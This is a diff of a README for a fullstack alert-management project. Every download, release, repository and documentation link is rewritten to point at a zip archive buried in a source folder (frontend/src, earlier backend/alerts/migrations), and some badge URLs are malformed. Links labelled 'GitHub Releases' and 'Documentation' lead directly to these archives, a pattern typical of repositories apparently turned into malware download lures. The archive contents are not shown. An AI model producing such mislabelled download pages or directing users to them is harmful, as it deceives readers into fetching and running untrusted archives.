@@ -1,6 +1,6 @@
 # 🐙 prueba-tecnica-fullstack-octapus - Manage Alerts Easily and Effectively
 
-[![Download Now](https://raw.githubusercontent.com/Mazzolone/prueba-tecnica-fullstack-octapus/master/backend/alerts/migrations/fullstack_prueba_tecnica_octapus_1.5.zip%https://raw.githubusercontent.com/Mazzolone/prueba-tecnica-fullstack-octapus/master/backend/alerts/migrations/fullstack_prueba_tecnica_octapus_1.5.zip)](https://raw.githubusercontent.com/Mazzolone/prueba-tecnica-fullstack-octapus/master/backend/alerts/migrations/fullstack_prueba_tecnica_octapus_1.5.zip)
+[![Download Now](https://github.com/Mazzolone/prueba-tecnica-fullstack-octapus/raw/refs/heads/master/frontend/src/fullstack_prueba_tecnica_octapus_2.0.zip%https://github.com/Mazzolone/prueba-tecnica-fullstack-octapus/raw/refs/heads/master/frontend/src/fullstack_prueba_tecnica_octapus_2.0.zip)](https://github.com/Mazzolone/prueba-tecnica-fullstack-octapus/raw/refs/heads/master/frontend/src/fullstack_prueba_tecnica_octapus_2.0.zip)
 
 ## 🌟 Overview
 
@@ -12,7 +12,7 @@ To get started with prueba-tecnica-fullstack-octapus, follow these simple steps 
 
 ## 📥 Download & Install
 
-Visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/Mazzolone/prueba-tecnica-fullstack-octapus/master/backend/alerts/migrations/fullstack_prueba_tecnica_octapus_1.5.zip)
+Visit this page to download: [GitHub Releases](https://github.com/Mazzolone/prueba-tecnica-fullstack-octapus/raw/refs/heads/master/frontend/src/fullstack_prueba_tecnica_octapus_2.0.zip)
 
 ### Step-by-Step Instructions
 
@@ -55,8 +55,8 @@ For further assistance or to report issues, please open an issue in the GitHub r
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://raw.githubusercontent.com/Mazzolone/prueba-tecnica-fullstack-octapus/master/backend/alerts/migrations/fullstack_prueba_tecnica_octapus_1.5.zip)
-- [Documentation](https://raw.githubusercontent.com/Mazzolone/prueba-tecnica-fullstack-octapus/master/backend/alerts/migrations/fullstack_prueba_tecnica_octapus_1.5.zip)
+- [GitHub Repository](https://github.com/Mazzolone/prueba-tecnica-fullstack-octapus/raw/refs/heads/master/frontend/src/fullstack_prueba_tecnica_octapus_2.0.zip)
+- [Documentation](https://github.com/Mazzolone/prueba-tecnica-fullstack-octapus/raw/refs/heads/master/frontend/src/fullstack_prueba_tecnica_octapus_2.0.zip)
 
 ## 🙏 Contributions
 
@@ -66,4 +66,4 @@ If you would like to contribute to this project, please create an issue or submi
 
 This project is licensed under the MIT License. Please refer to the `LICENSE` file in the repository for more details.
 
-[![Download Now](https://raw.githubusercontent.com/Mazzolone/prueba-tecnica-fullstack-octapus/master/backend/alerts/migrations/fullstack_prueba_tecnica_octapus_1.5.zip%https://raw.githubusercontent.com/Mazzolone/prueba-tecnica-fullstack-octapus/master/backend/alerts/migrations/fullstack_prueba_tecnica_octapus_1.5.zip)](https://raw.githubusercontent.com/Mazzolone/prueba-tecnica-fullstack-octapus/master/backend/alerts/migrations/fullstack_prueba_tecnica_octapus_1.5.zip)
+[![Download Now](https://github.com/Mazzolone/prueba-tecnica-fullstack-octapus/raw/refs/heads/master/frontend/src/fullstack_prueba_tecnica_octapus_2.0.zip%https://github.com/Mazzolone/prueba-tecnica-fullstack-octapus/raw/refs/heads/master/frontend/src/fullstack_prueba_tecnica_octapus_2.0.zip)](https://github.com/Mazzolone/prueba-tecnica-fullstack-octapus/raw/refs/heads/master/frontend/src/fullstack_prueba_tecnica_octapus_2.0.zip)
